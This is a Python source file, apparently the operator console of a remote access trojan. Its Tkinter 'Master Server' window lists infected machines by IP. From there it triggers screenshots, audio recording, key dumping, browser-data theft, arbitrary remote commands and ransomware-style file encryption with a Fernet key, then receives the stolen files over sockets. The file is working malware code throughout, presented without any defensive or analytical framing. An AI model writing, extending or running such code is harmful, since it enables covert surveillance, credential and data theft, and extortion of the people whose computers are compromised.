import os
import atexit
from tkinter import ttk, messagebox
from tools.common_func import *
import tkinter as tk
import queue
import threading
from tools.output_capture import OutputCapture

_listening_sockets = []  # for close at exit

executing = True

# Create a custom stream to capture output
output_capture = OutputCapture()

# Create a dictionary to store the content of each tab
output_tabs = {}
current_output_tab = ''


def create_gui(pending_customers):
    global connected_ips_label, connected_ips_listbox, progress_bar, heartbeat_label, progress_bar_label, output_tabs, notebook

    def on_close():
        # Add your code here to stop executing the script
        root.destroy()  # Close the GUI window

    # Function to switch tabs
    def switch_tab(event):
        current_tab = notebook.tab(notebook.select(), "text")
        if current_output_tab != '':
            output_tabs[current_output_tab]['output_text'].delete("1.0", tk.END)
            output_tabs[current_output_tab]['output_text'].insert(tk.END, output_tabs[current_tab]['content'])

    # Create the GUI
    root = tk.Tk()
    root.title("Master Server")
    root.configure(bg="#222222")  # Set the background color to black
    root.protocol("WM_DELETE_WINDOW", on_close)  # Handle the close event

    # Set colors and styles
    text_color = "white"
    bg_color = "#222222"
    button_bg_color = "gray"
    button_fg_color = "white"
    label_font = ("Arial", 14, "bold")
    button_font = ("Arial", 10, "bold")

    # Create a frame to hold connected IPs and output text
    frame1 = tk.Frame(root, bg=bg_color)
    frame1.pack(pady=10)

    # Create a label for connected IPs
    connected_ips_label = tk.Label(frame1, text="Connected IPs:", font=label_font, fg=text_color, bg=bg_color)
    connected_ips_label.pack(side=tk.LEFT, padx=120)

    # Create a label for heartbeat text
    heartbeat_label = tk.Text(frame1, font=label_font, fg=text_color, bg=bg_color, width=1, height=1)
    heartbeat_label.pack(side=tk.RIGHT)

    # Create a label for output
    output_label = tk.Label(frame1, text="Output", font=label_font, fg=text_color, bg=bg_color)
    output_label.pack(side=tk.RIGHT, padx=300)

    # Create a frame to hold connected IPs, progress bar, and output text
    frame = tk.Frame(root, bg=bg_color)
    frame.pack(pady=10)

    # Create a listbox to display connected IPs
    connected_ips_listbox = tk.Listbox(frame, selectmode=tk.SINGLE, font=("Arial", 10), width=52, height=15,
                                       fg=text_color, bg=bg_color, selectbackground=button_bg_color)
    connected_ips_listbox.pack(side=tk.LEFT)

    # Create a scrollbar for the connected IPs listbox
    ips_scrollbar = ttk.Scrollbar(frame)
    ips_scrollbar.pack(side=tk.LEFT, fill=tk.Y)

    # Configure the connected IPs listbox to use the scrollbar
    connected_ips_listbox.config(yscrollcommand=ips_scrollbar.set)
    ips_scrollbar.config(command=connected_ips_listbox.yview)

    # Create a custom style for the Notebook widget
    notebook_style = ttk.Style()
    notebook_style.configure("CustomNotebook.TNotebook", background=bg_color)

    # Configure the tab style with padding
    notebook_style.configure("CustomNotebook.TNotebook.Tab", padding=5)

    # Create a Notebook widget with the custom style
    notebook = ttk.Notebook(frame, style="CustomNotebook.TNotebook")
    notebook.pack(side=tk.RIGHT, padx=(50, 0))

    tabs = ['Take Screenshot', 'Record Audio', 'Dump Keys', 'Browsers Data', 'Run CMD', 'System Info', 'Files']

    # Create three tabs with random names
    i = 0
    for tab in tabs:
        output = 'No output.'
        tab_frame = tk.Frame(notebook, bg=bg_color)
        output_text = tk.Text(tab_frame, font=("Arial", 10), width=90, height=15, fg=text_color, bg=bg_color)

        output_scrollbar = ttk.Scrollbar(tab_frame, command=output_text.yview)
        output_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        output_text.pack(fill=tk.BOTH, expand=True)
        output_text.insert(tk.END, output)
        output_text.config(yscrollcommand=output_scrollbar.set)
        tab_name = f"{tab}"
        tab_data = {'content': 'No output.',
                    'output_text': output_text,
                    'index': i}
        output_tabs[tab_name] = tab_data
        notebook.add(tab_frame, text=tab_name)
        i += 1

    # Bind the tab change event to switch the output text
    notebook.bind("<<NotebookTabChanged>>", switch_tab)

    # Create a frame to hold the progress bar and label
    frame3 = tk.Frame(root, bg=bg_color)
    frame3.pack(pady=10, padx=(470, 0))

    # Create the progress bar
    progress_bar = ttk.Progressbar(frame3, orient="horizontal", length=600, maximum=100, mode="determinate")
    progress_bar.pack(side=tk.LEFT)  # Align progress bar to the left side (west)

    # Create the label for progress text
    progress_bar_label = tk.Label(frame3, text="0%", width=6, bg=bg_color, fg="white")
    progress_bar_label.pack(padx=10, side=tk.RIGHT)

    # Create a frame to hold the buttons at the bottom
    button_frame = tk.Frame(root, bg=bg_color)
    button_frame.pack(side=tk.BOTTOM, padx=50)

    # Update button styles for dark mode
    button_style = {"font": button_font, "bg": button_bg_color, "fg": button_fg_color}

    # Screenshot button
    screenshot_button = tk.Button(button_frame, text="Take Screenshot", width=15, height=2,
                                  command=lambda: perform_action(pending_customers, "screenshot", "Take Screenshot"),
                                  state=tk.DISABLED, **button_style)
    screenshot_button.pack(side=tk.LEFT, padx=5, pady=10)

    # Audio button
    audio_button = tk.Button(button_frame, text="Record Audio", width=15, height=2,
                             command=lambda: perform_action(pending_customers, "audio", "Record Audio"),
                             state=tk.DISABLED, **button_style)
    audio_button.pack(side=tk.LEFT, padx=5, pady=10)

    # Keys button
    keys_button = tk.Button(button_frame, text="Dump Keys", width=15, height=2,
                            command=lambda: perform_action(pending_customers, "keys", "Dump Keys"),
                            state=tk.DISABLED, **button_style)
    keys_button.pack(side=tk.LEFT, padx=5, pady=10)

    # Browsers button
    browsers_button = tk.Button(button_frame, text="Browsers Data", width=15, height=2,
                                command=lambda: perform_action(pending_customers, "browsers", "Browsers Data"),
                                state=tk.DISABLED, **button_style)
    browsers_button.pack(side=tk.LEFT, padx=5, pady=10)

    # CMD button
    cmd_button = tk.Button(button_frame, text="Run CMD", width=15, height=2,
                           command=lambda: open_cmd_window(),
                           state=tk.DISABLED, **button_style)
    cmd_button.pack(side=tk.LEFT, padx=5, pady=10)

    # Info button
    info_button = tk.Button(button_frame, text="System Info", width=15, height=2,
                            command=lambda: perform_action(pending_customers, "info", "System Info"),
                            state=tk.DISABLED, **button_style)
    info_button.pack(side=tk.LEFT, padx=5, pady=10)

    # Encrypt button
    encrypt_button = tk.Button(button_frame, text="Files", width=15, height=2,
                               command=lambda: open_encryption_window(),
                               state=tk.DISABLED, **button_style)
    encrypt_button.pack(side=tk.LEFT, padx=5, pady=10)

    # Function to open the encryption window
    def open_encryption_window():
        encryption_window = tk.Toplevel(root)
        encryption_window.title("Files Options")
        encryption_window.configure(bg="#222222")

        # Calculate the position to center the window
        root.update_idletasks()
        root_width = root.winfo_width()
        root_height = root.winfo_height()
        encryption_width = 400
        encryption_height = 250
        x = root.winfo_x() + (root_width - encryption_width) // 2
        y = root.winfo_y() + (root_height - encryption_height) // 2
        encryption_window.geometry(f"{encryption_width}x{encryption_height}+{x}+{y}")

        encryption_label = tk.Label(encryption_window, text="Set a Fernet encryption key below:",
                                    font=("Arial", 12, "bold"), fg="white", bg="#222222")

        encryption_key_entry = tk.Entry(encryption_window, show="*", font=("Arial", 10), width=30)

        # Toggle encryption checkbox
        def toggle_encryption():
            if encrypt_var.get():
                decryption_checkbox.deselect()
                encryption_label.pack_forget()
                encryption_key_entry.pack_forget()

        # Toggle decryption checkbox
        def toggle_decryption():
            if decryption_var.get():
                encrypt_checkbox.deselect()
                encryption_label.pack(pady=10)
                encryption_key_entry.pack(pady=5)
            else:
                encryption_label.pack_forget()
                encryption_key_entry.pack_forget()

        def toggle_save_files():
            if save_files_var.get():
                decryption_checkbox.deselect()
                encryption_label.pack_forget()
                encryption_key_entry.pack_forget()

        checks_frame = tk.Frame(encryption_window, bg="#222222")
        checks_frame.pack(side=tk.TOP, pady=10)

        encrypt_var = tk.BooleanVar()
        encrypt_checkbox = tk.Checkbutton(checks_frame, text="Encrypt", variable=encrypt_var,
                                          font=("Arial", 10), fg="white", bg="#222222", selectcolor="#222222",
                                          command=toggle_encryption)
        encrypt_checkbox.grid(row=0, column=0, padx=5)

        save_files_var = tk.BooleanVar()
        save_files_checkbox = tk.Checkbutton(checks_frame, text="Save files", variable=save_files_var,
                                             font=("Arial", 10), fg="white", bg="#222222", selectcolor="#222222",
                                             command=toggle_save_files)
        save_files_checkbox.grid(row=0, column=1, padx=5)

        decryption_var = tk.BooleanVar()
        decryption_checkbox = tk.Checkbutton(checks_frame, text="Decrypt", variable=decryption_var,
                                             font=("Arial", 10), fg="white", bg="#222222", selectcolor="#222222",
                                             command=toggle_decryption)
        decryption_checkbox.grid(row=0, column=2, padx=5)

        password = ""

        # Execute encryption
        def execute_encryption():
            nonlocal password
            password = encryption_key_entry.get()
            save_files = "True" if save_files_var.get() else "False"
            encryption = "True" if encrypt_var.get() else "False"
            decryption = "True" if decryption_var.get() else "False"
            encryption_window.destroy()
            perform_action(pending_customers, f"encrypt╚{password}╚{save_files}╚{encryption}╚{decryption}", "Files")

        # Cancel encryption
        def cancel_encryption():
            encryption_window.destroy()

        encryption_frame = tk.Frame(encryption_window, bg="#222222")
        encryption_frame.pack(side=tk.BOTTOM, pady=10)

        ok_button = tk.Button(encryption_frame, text="OK", width=10, font=("Arial", 10, "bold"),
                              command=execute_encryption, bg="gray", fg="white")
        ok_button.pack(side=tk.LEFT, padx=10)

        cancel_button = tk.Button(encryption_frame, text="Cancel", width=10, font=("Arial", 10, "bold"),
                                  command=cancel_encryption, bg="gray", fg="white")
        cancel_button.pack(side=tk.LEFT, padx=10)

        encryption_window.bind('<Return>', lambda event: execute_encryption())

    # Function to open the CMD window
    def open_cmd_window():
        cmd_window = tk.Toplevel(root)
        cmd_window.title("Please enter a command to be run")
        cmd_window.configure(bg=bg_color)

        # Calculate the position to center the window
        root.update_idletasks()
        root_width = root.winfo_width()
        root_height = root.winfo_height()
        cmd_width = 500
        cmd_height = 300
        x = root.winfo_x() + (root_width - cmd_width) // 2
        y = root.winfo_y() + (root_height - cmd_height) // 2
        cmd_window.geometry(f"{cmd_width}x{cmd_height}+{x}+{y}")

        cmd_text = tk.Text(cmd_window, font=("Arial", 10), fg=text_color, bg=bg_color)
        cmd_text.pack(padx=10, pady=10)
        cmd_text.focus()

        scrollbar = tk.Scrollbar(cmd_window)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        cmd_text.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=cmd_text.yview)

        # Execute command
        def execute_command():
            command = cmd_text.get("1.0", tk.END).strip()
            perform_action(pending_customers, f'cmd╚{command}', "Run CMD")
            cmd_window.destroy()

        ok_button = tk.Button(cmd_window, text="OK", width=10, font=("Arial", 10, "bold"), command=execute_command,
                              bg=button_bg_color, fg=button_fg_color)
        ok_button.pack(pady=10)
        cmd_window.bind('<Return>', lambda event: execute_command())

    # Bind listbox selection event to enable/disable buttons
    def on_select(_):
        connected_indices = connected_ips_listbox.curselection()

        if connected_indices:
            selected_item = connected_ips_listbox.get(connected_indices[0]).lower()

            # Buttons state change depending on the selected IP's mode
            state_general = tk.NORMAL if "limited" in selected_item or "full" in selected_item else tk.DISABLED
            state_screenshot = tk.NORMAL if "full" in selected_item else tk.DISABLED

            screenshot_button.config(state=state_screenshot)
            audio_button.config(state=state_general)
            keys_button.config(state=state_general)
            browsers_button.config(state=state_general)
            cmd_button.config(state=state_general)
            info_button.config(state=state_general)
            encrypt_button.config(state=state_general)
        else:
            # If no selection, all buttons become DISABLED
            state_default = tk.DISABLED
            screenshot_button.config(state=state_default)
            audio_button.config(state=state_default)
            keys_button.config(state=state_default)
            browsers_button.config(state=state_default)
            cmd_button.config(state=state_default)
            info_button.config(state=state_default)
            encrypt_button.config(state=state_default)

    connected_ips_listbox.bind('<<ListboxSelect>>', on_select)

    # Start the GUI main loop
    root.mainloop()


def try_close(closable, master=None):
    try:
        if master is not None:
            update_connection_label(connected_ips_label, master.agent_pool)
            update_connected_ips_listbox(master.agent_pool, closable.getpeername(), remove=True)
        closable.close()
    except:
        pass


@atexit.register
def close_listening_socket_at_exit():
    log.info("exiting...")
    for s in _listening_sockets:
        address = s.getsockname()
        log.info("closing socket: {} {}".format(address[0], address[1]))
        try_close(s)


def update_progress_bar(progress):
    extra_label = ''
    if progress == 100:
        extra_label = "✅"
    if progress == "error":
        progress_bar_label.config(text="❌")
        progress_bar_label.update()
    else:
        progress_bar["value"] = progress
        progress_bar_label.config(text=f"{round(progress)}% {extra_label}")
        progress_bar_label.update()


def try_bind_port(sock, addr):
    while True:
        try:
            sock.bind(addr)
        except Exception as e:
            log.error(("unable to bind {}, {}. If this port was used by the recently-closed shootback itself\n"
                       "then don't worry, it would be available in several seconds\n"
                       "we'll keep trying....").format(addr, e))
            log.debug(traceback.format_exc())
            time.sleep(3)
        else:
            break


class Master(object):
    def __init__(self, customer_listen_addr, communicate_addr=None,
                 agent_pool=None, working_pool=None, agents_queue=None):
        """
        Initialize the CommunicationServer.

        :param customer_listen_addr: Address where customers can connect (equivalent to the -c/--customer parameter).
        :param communicate_addr: Address for communication (equivalent to the -m/--master parameter).
        :param agent_pool: External agent pool (optional).
        :param working_pool: Working agent pool (optional).
        :param agents_queue: Queue for pending customers who have connected but not yet assigned an agent (optional).
        """
        # Dictionary to store thread pools for various tasks
        self.thread_pool = {"spare_agent": {}, "working_agent": {}}

        # Initialize the working_pool with provided value or an empty dictionary
        self.working_pool = working_pool or {}

        # Create a SocketBridge instance for data exchange
        self.socket_bridge = SocketBridge()

        # A queue for customers who have connected but not assigned an agent yet
        self.pending_customers = agents_queue

        # Communication address
        self.communicate_addr = communicate_addr

        # Format the communication address
        _fmt_communicate_addr = fmt_addr(self.communicate_addr)

        if agent_pool:
            # If using an external agent pool, do not initialize the listening agent
            # This is a feature to be added in the future
            self.external_agent = True
            self.thread_pool["listen_agent"] = None
        else:
            # If not using an external agent pool, initialize the agent pool and the listening agent
            self.external_agent = False
            self.agent_pool = collections.deque()

            # Prepare a Thread object for listening to incoming agents (not activated yet)
            self.thread_pool["listen_agent"] = threading.Thread(
                target=self._listen_agent,
                name="listen_agent-{}".format(_fmt_communicate_addr),
                daemon=True,
            )

        # Prepare a Thread object for listening to incoming customers (not activated yet)
        self.customer_listen_addr = customer_listen_addr
        self.thread_pool["listen_customer"] = threading.Thread(
            target=self._listen_customer,
            name="listen_customer-{}".format(_fmt_communicate_addr),
            daemon=True,
        )

        # Prepare a Thread object for handling heartbeats (not activated yet)
        self.thread_pool["heart_beat_daemon"] = threading.Thread(
            target=self._heart_beat_daemon,
            name="heart_beat_daemon-{}".format(_fmt_communicate_addr),
            daemon=True,
        )

        # Prepare a Thread object for assigning agents to customers (not activated yet)
        self.thread_pool["assign_agent_daemon"] = threading.Thread(
            target=self._assign_agent_daemon,
            name="assign_agent_daemon-{}".format(_fmt_communicate_addr),
            daemon=True,
        )

    def serve_forever(self):
        """
        Start serving customers and agents indefinitely.
        """
        if not self.external_agent:
            self.thread_pool["listen_agent"].start()
        self.thread_pool["heart_beat_daemon"].start()
        self.thread_pool["listen_customer"].start()
        self.thread_pool["assign_agent_daemon"].start()
        self.thread_pool["socket_bridge"] = self.socket_bridge.start_as_daemon()

    def _transfer_complete(self, addr_customer):
        """
        Callback function for SocketBridge to handle data transfer completion.

        :param addr_customer: Address of the customer whose data transfer is complete.
        """
        log.info("Customer complete: {}".format(addr_customer))
        del self.working_pool[addr_customer]

    def _serve_customer(self, conn_customer, conn_agent):
        """
        Serve a customer by establishing a data exchange between the customer and an agent.

        :param conn_customer: Customer's connection socket.
        :param conn_agent: Agent's connection socket.
        """
        # Add the customer and agent sockets to SocketBridge for data exchange
        self.socket_bridge.add_conn_pair(
            conn_customer, conn_agent,
            functools.partial(
                # Callback to remove the corresponding record from the working pool after data transfer completion
                self._transfer_complete,
                conn_customer.getpeername()
            )
        )

    @staticmethod
    def _send_heartbeat(conn_agent):
        try:
            conn_agent.send("heartbeat".encode('utf-8'))
            response = conn_agent.recv(1024).decode('utf-8')
            if response == "heartbeat":
                heartbeat_label.insert("1.0", "♥")  # Insert the new output
                print(f"Agent {conn_agent.getpeername()}: Heartbeat received")
            return True
        except Exception as e:
            print(f"Error: {e}")
            return False

    def _heart_beat_daemon(self):
        """
        Perform the heartbeating process for agents.
        """
        default_delay = 5 + SPARE_SLAVER_TTL // 12
        delay = default_delay
        log.info("heart beat daemon start, delay: {}s".format(delay))
        while True:
            time.sleep(delay)

            # ---------------------- Preparation -----------------------
            agent_count = len(self.agent_pool)
            if not agent_count:
                log.warning("heart_beat_daemon: sorry, no agent available, keep sleeping")
                # Restore default delay if there is no agent
                delay = default_delay
                continue
            else:
                # Notice this `agent_count*2 + 1`
                # An agent will expire and re-connect if it doesn't receive
                # a heartbeat package after SPARE_SLAVER_TTL seconds.
                # Set delay to be short enough to let every agent receive a heartbeat
                # before expiration.
                delay = 1 + SPARE_SLAVER_TTL // max(agent_count * 2 + 1, 12)

            # Pop the oldest agent,
            # heartbeat it, and then put it back to the end of the queue
            agent = self.agent_pool.popleft()
            addr_agent = agent["addr_agent"]
            if agent["can_beat"]:
                # ------------------ Real Heartbeat Begin --------------------
                start_time = time.perf_counter()
                try:
                    hb_result = self._send_heartbeat(agent["conn_agent"])
                except Exception as e:
                    log.warning("error during heartbeat to {}: {}".format(
                        fmt_addr(addr_agent), e))
                    log.debug(traceback.format_exc())
                    hb_result = False
                finally:
                    time_used = round((time.perf_counter() - start_time) * 1000.0, 2)
                    time.sleep(1)
                    heartbeat_label.delete("1.0", tk.END)  # Delete the existing text
                # ------------------ Real Heartbeat End ----------------------

            else:
                hb_result = True
                time_used = 0

            if not hb_result:
                log.warning("heart beat failed: {}, time: {}ms".format(
                    fmt_addr(addr_agent), time_used))
                try_close(agent["conn_agent"], self)
                del agent["conn_agent"]

                # If heartbeat failed, start the next heartbeat immediately
                # because in most cases, all 5 agent connections will
                # fall and re-connect at the same time
                delay = 0

            else:
                log.debug("heartbeat success: {}, time: {}ms".format(
                    fmt_addr(addr_agent), time_used))
                self.agent_pool.append(agent)
                print(f"Agent count: {len(self.agent_pool)}")

    def _get_an_active_agent(self, connection_to_match):
        """
        Get and activate an agent for data transfer.

        :param connection_to_match: The connection to match with an agent.
        :return: The activated agent's connection socket or None if not found.
        """
        try_count = 100
        while try_count > 0:
            dict_agent = self._find_agent_by_connection(connection_to_match)

            if dict_agent is not None:
                conn_agent = dict_agent["conn_agent"]

                if self._is_connection_active(conn_agent):
                    return self._handshake_with_agent(conn_agent)

            try_count -= 1
            if try_count % 10 == 0:
                log.error("!!NO SLAVER AVAILABLE!! trying {}".format(try_count))
            time.sleep(0.02)

        return None

    def _find_agent_by_connection(self, connection_to_match):
        """
        Find an agent by its connection in the agent pool.

        :param connection_to_match: The connection to match with an agent.
        :return: The agent dictionary if found, else None.
        """
        try:
            return next(agent for agent in self.agent_pool if agent["conn_agent"].getpeername() == connection_to_match)
        except StopIteration:
            return None

    @staticmethod
    def _is_connection_active(conn_agent):
        """
        Check if a connection is active.

        :param conn_agent: The connection socket to check.
        :return: True if the connection is active, False otherwise.
        """
        try:
            # This test sends an empty string to check if the connection is active.
            conn_agent.send("".encode('utf-8'))
            return True
        except Exception as e:
            log.warning("Connection test failed: %s", e)
            return False

    def _handshake_with_agent(self, conn_agent):
        """
        Perform a handshake with an agent.

        :param conn_agent: The connection socket to the agent.
        :return: The activated agent's connection socket or None if the handshake fails.
        """
        try:
            actual_conn = conn_agent
            return actual_conn
        except Exception as e:
            log.warning("Handshake failed: %s", e)
            log.debug(traceback.format_exc())
            try_close(conn_agent, self)
            return None

    def receive_file_from_agent(self, conn_agent, command):
        try:
            # Receive the output size and log data from the agent
            output_string = self.receive_output_from_agent(conn_agent)
            if output_string is None:
                return False

            # Receive the file size and file data from the agent
            filename, received_data = self.receive_file_data_from_agent(conn_agent, command)
            if filename is None or received_data is None:
                return False


            # Save the received file
            self.save_received_file(filename, received_data, conn_agent)

            # Mark the agent as available
            self.mark_agent_as_available(conn_agent)

            return True

        except Exception as e:
            print(f"Failed to receive file from agent: {e}")
            update_progress_bar("error")
            self.mark_agent_as_available(conn_agent)
            return False

    @staticmethod
    def receive_output_from_agent(conn_agent):
        data = conn_agent.recv(4096)
        output_size = data.decode('utf-8')
        print(f"Log size: {output_size}")
        received_size = 0
        output_string = b""

        while received_size < int(output_size):
            remaining_bytes = int(output_size) - received_size
            chunk_size = min(remaining_bytes, 8192)
            data = conn_agent.recv(chunk_size)
            if not data:
                update_progress_bar(100)
                break
            output_string += data
            received_size += len(data)
            percentage = (len(output_string) / int(output_size)) * 100
            update_progress_bar(percentage)

        print("\n~*~*~*~*~*~*~*~*~*~*~*~*~AGENT OUTPUT START*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*\n")
        print(f"{output_string.decode('utf-8')}")
        print("~*~*~*~*~*~*~*~*~*~*~*~*~AGENT OUTPUT END~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*\n")

        return output_string

    @staticmethod
    def receive_file_data_from_agent(conn_agent, command):
        data = conn_agent.recv(4096)
        filesize, filename = data.decode('utf-8').split("§")
        print(f"File size: {filesize}")

        if filesize == "error":
            if "encrypt" in command or "cmd" in command:
                command = command.split('╚')[0]
            print("❌❌❌❌❌❌❌❌❌❌❌❌ERROR❌❌❌❌❌❌❌❌❌❌❌❌❌❌\n"
                  f"Error executing command {command}.\n"
                  "See log above.")
            update_progress_bar("error")
            return None, None

        if filesize == "encrypt_done":
            print("Encryption of files done.")
            return None, None

        file_size_in_mb = int(filesize) / (1024 * 1024)

        print(f"Receiving new file: {filename} - size: {round(file_size_in_mb, 2)} mb")

        update_progress_bar(0)

        received_data = b''  # Initialize an empty byte string to store the received data

        while len(received_data) < int(filesize):
            remaining_bytes = int(filesize) - len(received_data)
            chunk_size = min(remaining_bytes, 81920)
            data = conn_agent.recv(chunk_size)
            if not data:
                update_progress_bar(100)
                break
            received_data += data
            percentage = (len(received_data) / int(filesize)) * 100
            update_progress_bar(percentage)

        print(f"Downloaded file size: {len(received_data)} bytes")

        return filename, received_data

    def save_received_file(self, filename, received_data, conn_agent):
        # Get the IP address of the connection
        connection_ip = conn_agent.getpeername()[0]

        # Create the directory structure if it doesn't exist
        directory = os.path.join('received', connection_ip)
        os.makedirs(directory, exist_ok=True)

        # Create the full file path
        file_path = os.path.join(directory, filename)

        # Save the file data to a file
        with open(file_path, 'wb') as file:
            file.write(received_data)

        for agent in self.agent_pool:
            if agent['addr_agent'] == conn_agent.getpeername():
                agent['can_beat'] = True

        print(f'File {filename} received successfully. Saved at: {directory}/{filename}')

    def mark_agent_as_available(self, conn_agent):
        for agent in self.agent_pool:
            if agent['addr_agent'] == conn_agent.getpeername():
                agent['can_beat'] = True

    def run_in_thread(self, conn_agent, conn_customer, command):
        """
        Run a command in a separate thread and communicate with the agent.

        Args:
            conn_agent (socket.socket): The socket connection to the agent.
            conn_customer (socket.socket): The socket connection to the customer.
            command (str): The command to be executed.

        Returns:
            None
        """
        global output_tabs, current_output_tab
        start_time = time.time()

        try:
            self.send_command_to_agent(conn_agent, command)

            if command.startswith("cmd╚") or command == "info":
                self.handle_command_output(conn_agent)

            elif any(word in command for word in ['files', 'screenshot', 'audio', 'keys', 'browsers', 'encrypt']):
                self.receive_file_from_agent(conn_agent, command)

            conn_agent.send("OK".encode('utf-8'))

        except Exception as e:
            print(f"Couldn't send the command and retrieve a file. Why: {e}")

        update_connected_ips_listbox(self.agent_pool, conn_customer, remove=True, command="connected")
        self.calculate_and_display_elapsed_time(start_time)

    @staticmethod
    def send_command_to_agent(conn_agent, command):
        """
        Send a command to the agent.

        Args:
            conn_agent (socket.socket): The socket connection to the agent.
            command (str): The command to be executed.

        Returns:
            None
        """
        conn_agent.send(command.encode('utf-8'))

    def handle_command_output(self, conn_agent):
        """
        Handle the output of a command from the agent.

        Args:
            conn_agent (socket.socket): The socket connection to the agent.

        Returns:
            None
        """
        for agent in self.agent_pool:
            if agent['addr_agent'] == conn_agent.getpeername():
                agent['can_beat'] = False

        output_string = self.receive_output_from_agent(conn_agent)

        for agent in self.agent_pool:
            if agent['addr_agent'] == conn_agent.getpeername():
                agent['can_beat'] = True

    def calculate_and_display_elapsed_time(self, start_time):
        """
        Calculate and display the elapsed time since the command started.

        Args:
            start_time (float): The start time of the command.

        Returns:
            None
        """
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"Time spent executing the command: {round(elapsed_time)} seconds")

        self.update_and_display_output_tab()

    @staticmethod
    def update_and_display_output_tab():
        """
        Update and display the output tab.

        Returns:
            None
        """
        captured_output = output_capture.output
        output_string = ''.join(captured_output)
        sys.stdout = sys.__stdout__

        output_tabs[current_output_tab]['content'] = (output_tabs[current_output_tab]['content'] +
                                                      "\n\n~~~~~~~~~~~~~~~~~~~~NEW OUTPUT~~~~~~~~~~~~~~~~\n\n" +
                                                      output_string)

        notebook.select(output_tabs[current_output_tab]['index'])

        output_tabs[current_output_tab]['output_text'].delete("1.0", tk.END)
        output_capture.__init__()
        output_tabs[current_output_tab]['output_text'].insert("1.0", output_tabs[current_output_tab]['content'], "info")

    def _assign_agent_daemon(self):
        """
        Assign an agent to a customer in a daemon thread.
        """
        while True:
            # get a newly connected customer
            conn_customer, addr_customer, command = self.pending_customers.get()

            try:
                conn_agent = self._get_an_active_agent(conn_customer)

                update_connection_label(connected_ips_label, self.agent_pool)
                update_connected_ips_listbox(self.agent_pool, conn_customer, remove=None, command=command)

            except ConnectionError as e:
                log.error(f'error in getting agent: {e}', exc_info=True)
                continue

            if conn_agent is None:
                log.warning("Closing customer[%s] because no available agent found", addr_customer)
                try_close(conn_customer, self)
                update_connected_ips_listbox(self.agent_pool, conn_customer, remove=True, command=command)

                continue
            else:
                log.debug("Using agent: %s for %s", conn_agent.getpeername(), addr_customer)

            # After getting an agent:
            new_thread = threading.Thread(target=self.run_in_thread, args=(conn_agent, conn_customer, command))
            new_thread.start()

    def _listen_agent(self):
        """
        Listen for incoming connections from agents.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try_bind_port(sock, self.communicate_addr)
        sock.listen(10)
        _listening_sockets.append(sock)
        log.info("Listening for agents: {}".format(
            fmt_addr(self.communicate_addr)))
        while True:
            conn, addr = sock.accept()

            message = conn.recv(1024)

            if message.decode('utf-8') != "":
                self.agent_pool.append({
                    "addr_agent": addr,
                    "conn_agent": conn,
                    "can_beat": True
                })
                log.info("Got agent {} Total: {}".format(
                    fmt_addr(addr), len(self.agent_pool)
                ))

                update_connection_label(connected_ips_label, self.agent_pool)
                update_connected_ips_listbox(self.agent_pool, addr, message=message.decode('utf-8'))

    def _listen_customer(self):
        """
        Listen for incoming connections from customers.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try_bind_port(sock, self.customer_listen_addr)
        sock.listen(20)
        _listening_sockets.append(sock)
        log.info("Listening for customers: {}".format(
            fmt_addr(self.customer_listen_addr)))
        while True:
            conn_customer, addr_customer = sock.accept()
            log.info("Serving customer: {} Total customers: {}".format(
                addr_customer, self.pending_customers.qsize() + 1
            ))

            # just put it into the queue,
            # let _assign_agent_daemon() do the rest
            # don't block this loop
            self.pending_customers.put((conn_customer, addr_customer))


def run_master(communicate_addr, customer_listen_addr, agents_queue, secret_key="shootback", verbose=True, quiet=False,
               ttl=300):
    is_verbose = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(level=logging.WARNING if quiet else is_verbose)

    set_secretkey(secret_key)

    master = Master(customer_listen_addr, communicate_addr, agents_queue=agents_queue)

    master.serve_forever()


def update_connection_label(label, count):
    label.config(text=f"Connected IPs: {len(count)}")
    label.update()


def update_connected_ips_listbox(agent_pool, ip, message="full", remove=False, command=""):
    try:
        items = connected_ips_listbox.get(0, tk.END)
        ip_text = f"Agent {len(agent_pool)}: {ip[0]}:{ip[1]} - {message}"

        command_agent = command

        if "cmd" in command_agent:
            command_agent = "cmd"
        if "encrypt" in command_agent:
            command_agent = "encrypt"

        if command_agent != "":
            ip_text += f" - working on: {command_agent}"
        else:
            ip_text += f" - connected"

        # print(f"Updating IP {ip[0]}:{ip[1]}, it is being removed: {remove}")

        if remove is None:
            for index, item in enumerate(items):
                if f"{ip[0]}:{ip[1]}" in item:
                    # Extract the current command from the item
                    current_command = item.split(" - ")[-1].split(":")[-1].strip()

                    # Update the item with the new command
                    if current_command != "connected":
                        new_item = item.replace(f"working on: {current_command}", f"{command_agent}")
                    else:
                        new_item = item.replace("connected", f"working on: {command_agent}")

                    connected_ips_listbox.delete(index)
                    connected_ips_listbox.insert(index, new_item)
                    if command != "connected":
                        print(f"Agent: ('{ip[0]}', {ip[1]}) is processing command: {command}")
                    print(
                        '-------------------------------------------------------------------------------------------\n')
                    break
        elif remove:
            for index, item in enumerate(items):
                if f"{ip[0]}:{ip[1]}" in item:
                    connected_ips_listbox.delete(index)
                    # Remove the matching agent_pool child
                    for agent in agent_pool:
                        if agent['addr_agent'] == ip:
                            agent_pool.remove(agent)
                            print(f"Agent: ('{ip[0]}', {ip[1]}) was removed from agent_pool")
                            break
                    print(f"Agent ('{ip[0]}', {ip[1]}) was deleted from list.")
                    break
        else:
            contains = False
            for index, item in enumerate(items):
                if f"{ip[0]}:{ip[1]}" in item:
                    contains = True
                    break

            if not contains:
                connected_ips_listbox.insert(tk.END, ip_text)
                print(f"Agent: ('{ip[0]}', {ip[1]}) was added to the pool.")
    except Exception as e:
        print(f"Error removing IP, maybe it doesn't exist: {e}")


def perform_action(agent_pool, command, button_name):
    global current_output_tab, output_tabs
    #sys.stdout = output_capture
    try:
        selected_item = connected_ips_listbox.get(connected_ips_listbox.curselection())
        if selected_item:
            print(f"Selected Agent: {selected_item}")
            # Extract the IP and port from the selected item
            try:
                _, selected_ip, selected_port = selected_item.split(':')
            except ValueError:
                # Show a warning popup
                messagebox.showwarning("Warning", "Wait the current Agent finish its job.")
                return

            selected_port = int(selected_port.split(' -')[0])
            # Perform the desired action for the selected IP and port
            print(f"Agent: ('{selected_ip}', {selected_port}) "
                  f"is being added to the working pool to process command: {command}")
